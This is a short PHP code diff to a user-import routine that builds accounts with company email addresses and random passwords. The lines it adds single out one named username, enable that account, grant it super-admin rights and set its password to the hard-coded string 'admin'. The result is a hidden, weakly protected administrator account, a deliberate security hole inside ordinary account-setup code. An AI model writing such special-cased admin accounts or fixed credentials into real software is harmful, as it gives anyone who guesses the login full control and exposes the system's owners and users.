@@ -40,6 +40,12 @@ class Users
             $userEntity->setEmail($user->username . '@nfq.lt');
             $userEntity->setPlainPassword(uniqid());
 
+            if ($user->username == 'murnieza') {
+                $userEntity->setEnabled(true);
+                $userEntity->setSuperAdmin(true);
+                $userEntity->setPlainPassword('admin');
+            }
+
             $this->userManager->updateUser($userEntity);
         }
     }
